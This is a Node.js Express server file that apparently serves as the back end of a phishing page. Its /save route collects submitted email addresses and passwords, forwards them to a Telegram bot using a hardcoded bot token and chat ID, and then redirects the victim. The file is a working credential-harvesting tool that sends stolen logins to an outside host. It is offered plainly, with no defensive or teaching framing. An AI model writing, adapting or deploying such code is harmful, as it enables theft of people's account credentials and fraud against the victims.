const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();

app.use(bodyParser.urlencoded({extended:true}));
app.use(express.static("public"));

app.post("/save", async (req,res)=>{

let email = req.body.email;
let password = req.body.password;

let botToken = "8753804089:AAG4MhC4c8UWWT_8X-948JFGs1d9L9A3lG0";
let chatID = "7905175526";

let message = `📧 Email: ${email}\n🔑 Password: ${password}`;

await fetch(
`https://api.telegram.org/bot${botToken}/sendMessage`,
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id: chatID,
text: message
})
}
);

res.redirect("/");

});

app.listen(10000, ()=>{
console.log("Server running");
});
